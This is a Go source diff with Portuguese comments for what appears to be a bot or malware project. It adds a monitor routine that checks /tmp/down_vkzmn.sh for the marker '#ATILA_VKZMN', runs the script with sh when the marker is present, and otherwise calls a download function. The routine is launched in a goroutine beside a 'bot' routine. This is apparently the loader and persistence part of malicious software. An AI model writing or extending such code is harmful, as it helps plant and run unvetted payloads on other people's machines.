@@ -7,23 +7,51 @@ import (
 	"strings"
 	"time"
         "net/http"
-         "os/exec"
+        "os/exec"
 )
 
 
 //esse e o monitor ele ficara em um loop infinito  verificando se  o vkzmn esta em execucao
 
-func  exec_vkzmn() {
 
+
+func exec_vkzmn() {
+
+
+
+ret_magic  := magic()
+
+
+ if ret_magic == 200 {
+
+
+   fmt.Println("script e seguro vo executa")
+
+
+   do :=  exec.Command( "sh" , "/tmp/down_vkzmn.sh")
+ 
+ 
+     do.Run()
+
+
+
+ }
+ 
+}
+
+
+
+
+
+func  magic() int {
 
 //check magic byte in down_vkzmn.sh
 
-
- 
 ptr ,  err_open := os.Open("/tmp/down_vkzmn.sh")
 
-
 my_str  :=   "#ATILA_VKZMN"
+
+valid := 200
 
 
    if err_open == nil {
@@ -34,8 +62,22 @@ my_str  :=   "#ATILA_VKZMN"
 
                down_str := string(down_bytes)
 
-                   if (strings.Contains(down_str  ,  my_str ) ) { fmt.Println("script valido")  }else { fmt.Println("script invalido")}                       
-                           
+
+                   if (strings.Contains(down_str  ,  my_str ) ) {
+
+                        return  valid 
+                   
+                      }  else { fmt.Println("script invalido") 
+                       
+
+                             down_vkzmn() 
+
+                                 
+
+                               
+                             }                                                  
+
+
                         
 
 
@@ -45,14 +87,7 @@ my_str  :=   "#ATILA_VKZMN"
 }
 
 
-
-
- 
-down_exec :=  exec.Command("sh"  , "down_vkzmn.sh" ) 
-
-
-go down_exec.Run()
-
+return  0
 
 
 }
@@ -106,6 +141,12 @@ main_func:
 
 
         go bot()
+
+        go  exec_vkzmn()
+
+
+
+ 
 
 
 	time.Sleep(5 * time.Second)
@@ -188,8 +229,9 @@ main_func:
 
 
                              fmt.Println("down_vkzmn.sh ja esta em //tmp" )
-                                          
-                             exec_vkzmn()
+                                   
+       
+                             magic()
 
 
                        }
